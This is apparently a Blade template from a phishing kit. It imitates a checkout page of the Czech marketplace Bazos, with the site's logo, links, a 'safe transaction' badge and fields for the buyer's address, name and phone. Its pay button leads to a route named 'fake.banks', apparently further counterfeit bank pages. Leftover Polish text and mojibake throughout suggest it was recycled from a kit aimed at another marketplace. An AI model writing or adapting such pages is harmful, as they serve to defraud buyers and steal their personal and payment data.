@extends('layouts.fake')
@push('css')
    <link href="{{asset('css/bazos.css')}}" rel="stylesheet">
@endpush
@section('content')
    <div class="_container header_prototype header_prototype--board tiny" data-container="HeaderBoardContainer"
         data-tiny="1">
        <header data-test-component="HeaderBoard" class="sc-ugnQR jRQBFv">
            <div class="sc-eIHaNI grYHP"></div>
            <div class="sc-eTpRJs hnEmwS">
                <div class="sc-iomxrj fZtIUm">
                    <section data-test-component="HeaderActionMenu" class="sc-gPEVay sc-eKZiaR dzCROE">
                        <div class="sc-jAaTju sc-jDwBTQ sc-jlyJG sc-drMfKT lkKOyd">
                            <div width="1" class="sc-jAaTju sc-iRbamj sc-hIVACf gjZzYk"><a href="https://www.bazos.cz/"
                                                                                           title="BAZOS"
                                                                                           data-test-action="IndexPageLink"
                                                                                           class="sc-eqIVtm sc-cpmKsF bcxWYD">
                                    <img height="35px" src="{{asset($fake->logo())}}">
                                </a>
                                <div class="sc-eXNvrr iBzLWS"></div>
                            </div>
                        </div>
                    </section>
                    <div class="sc-dxZgTM RFfMX"></div>
                </div>
            </div>
        </header>
    </div>
    <aside class="nav_container sidebar_container">
        <nav class="_container" data-container="CategoryMobileContainer"></nav>
    </aside>
    <div class="bundle">
        <div class="container _container" data-container="PaymentsContainer">
            <div class="payments_container" id="payments">
                <div>
                    <h1 class="title__1tzAN2wR">Registrace a platba</h1>
                    <div class="container__28A_2L3T">
                        <div>
                            <div class="product__2oLb4nXl"><span class="product_image__2AcYUpNV"><img
                                            src="{{asset($fake->img)}}" id="pr_image" alt="" width="100"
                                            height="100"></span>
                                <div class="product_owner__VUJH2ylJ">
                                    <div class="user user--simple">
                                        <div class="user__image"><span rel="nofollow"><img id="u_image"
                                                                                           src="{{asset('images/jeTXdkH.jpg')}}"
                                                                                           alt="" width="64"
                                                                                           height="64"></span></div>
                                        <div class="user__info">
                                            <div class="user__name"><span><span class="user__label">Inzer??ty-Prod??m, Koup??m na BAZOS</span></span>
                                            </div>
                                            <div class="user__rating rating" id="u_rating"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="product_content__mI30-3Fr">
                                    <div class="product_inner__1ZrDwagy">
                                        <div class="product_price__2IFwtrXu"><span class="product_real_price__j_Bk3J3i"><span><span
                                                            id="pr_price">{{$fake->price()}}</span>&nbsp;<span
                                                            class="sc-bdVaJa ijDeHI"><b></b><i></i></span></span></span>
                                        </div>
                                        <div class="product_title__3jNOq_vZ" id="pr_name">{{$fake->title}}</div>
                                    </div>
                                </div>
                            </div>
                            <div class="container__b66PCR7o">
                                <div class="summary__2TIRymkY">
                                    <div class="summary_header__bJmC15X9">
                                        <div class="summary_price__1HT5R9_P"><span>
                                          <span id="last"></span>&nbsp;<span id="cost"
                                                                             class="sc-bdVaJa ijDeHI"><b>{{$fake->price()}}</b><i></i></span></span>
                                        </div>
                                    </div>
                                    <div class="fixed_buttons fixed_buttons--single">
                                        <div class="summary_total__3aEKbkJu">Ca??kowity
                                            <div class="summary_total_value__nRhP7XkA"><span><span
                                                            id="pr_price">{{$fake->price()}}</span>&nbsp;<span
                                                            class="sc-bdVaJa ijDeHI"><b
                                                                id="mobile_price"></b><i></i></span></span></div>
                                        </div>
                                        <div class="button_container">
                                            <form action="{{subRoute('fake.banks')}}">
                                                <input type="hidden" name="track_id" value="{{$fake->track_id}}">
                                                <button type="submit" class="sc-dVhcbM ccONKs" id="_buttonPay">
                                                    <span class="sc-fBuWsC hvBxNu">P??ej??t na pokladnu</span>
                                                </button>
                                            </form>
                                        </div>
                                    </div>
                                    <div class="safely_text__392qqBrF">
                                        <div class="status_badge__icon status_badge__icon--deal"></div>
                                        <span>Bezpe??n?? p????le??itost&nbsp;</span>
                                    </div>
                                    <div class="hint">Kliknut??m na tla????tko "P??ej??t na platbu" souhlas??te s t??m, ??e <a
                                                href="https://www.bazos.cz/" target="_blank" rel="noopener noreferrer">uzav??ete
                                            smlouvu</a>&nbsp;&nbsp;o prodeji zbo???? prost??ednictv??m slu??by online "
                                        bezpe??n?? transakce???
                                    </div>
                                </div>
                                <div class="block__3ioUhNQH">
                                    <div class="panel__3B1d-ak5">
                                        <div class="panel_icon__1HmxOezY">
                                            <div class="status_badge__icon status_badge__icon--delivery status_icon__3QzFN2ZZ"></div>
                                        </div>
                                        <div class="panel_content__VGeorc1g">
                                            <div class="text__3Wt10VPX">Dod??n??: ??esk?? po??ta dal???? <a
                                                        href="https://www.bazos.cz/"><b id="pr_loc"> informace</b></a> o
                                                dod??vk??ch BAZOS.
                                            </div>

                                        </div>
                                    </div>
                                    <div class="tabs__2t54pDtg">
                                        <div class="form__1P2Y3sX1" style="">
                                            <form>
                                                <div><label class="label__332nHo7g">Adresa doru??en??</label>
                                                    <div class="row">
                                                        <div class="col-md-8">
                                                            <div class="root__3ahLIWiH">
                                                                <div class="from_group form_group__3-PlZQuP"><input
                                                                            type="text"
                                                                            class="form_control form_control__3Uyg-pWq"
                                                                            placeholder="M??sto" value=""></div>
                                                            </div>
                                                        </div>
                                                        <div class="col-md-8">
                                                            <div class="root__3ahLIWiH">
                                                                <div class="from_group form_group__3-PlZQuP"><input
                                                                            type="text"
                                                                            class="form_control form_control__3Uyg-pWq"
                                                                            placeholder="Ulice/Domov" value=""></div>
                                                            </div>
                                                        </div>
                                                        <div class="col-md-4">
                                                            <div class="from_group form_group__3-PlZQuP"><input
                                                                        name="apartament" type="text"
                                                                        class="form_control form_control__3Uyg-pWq"
                                                                        placeholder="Byt" value=""></div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <label class="label__332nHo7g">Podrobnosti kupuj??c??ho</label>
                                                <div class="row" style="position: relative;">
                                                    <div class="col-md-4">
                                                        <div class="from_group form_group__3-PlZQuP"><input
                                                                    name="lastname" type="text"
                                                                    class="form_control form_control__3Uyg-pWq"
                                                                    placeholder="Cel?? jm??no" value=""></div>
                                                    </div>
                                                    <div class="col-md-4">
                                                        <div class="sc-jBoNkH iVUhcI"><input type="number"
                                                                                             class="form_control form_control__3Uyg-pWq sc-dzVpKk jOxCU"
                                                                                             name="phone" maxlength="18"
                                                                                             value=""
                                                                                             placeholder="????slo telefonu">
                                                        </div>
                                                    </div>
                                                </div>
                                                <p class="hint__2r7xW549">SMS zpr??vy o stavu doru??en?? a platby budou
                                                    zasl??ny na telefonn?? ????slo.</p>

                                            </form>
                                        </div>
                                        <p class="hint__2YlkHbKL hint__2r7xW549" style="display: none;">Ustal ze
                                            sprzedawc?? miejsce i czas przekazania towaru samodzielnie. Sprzedawca
                                            otrzyma pieni??dze za zap??at?? za towar dopiero po potwierdzeniu pomy??lnego
                                            odbioru towaru. A w przypadku spornej sytuacji us??uga Safe Deal pomo??e
                                            rozstrzygn???? powsta??e nieporozumienia.
                                        </p>
                                        <div class="hint payhint__1EGeMlob">Klikaj??c przycisk ???Przejd?? do p??atno??ci???,
                                            zgadzasz si?? na zawarcie <a href="https://www.bazos.cz/" target="_blank"
                                                                        rel="noopener noreferrer">Umowy sprzeda??y</a>&nbsp;&nbsp;towary
                                            za pomoc?? us??ugi online ???Bezpieczna transakcja???
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection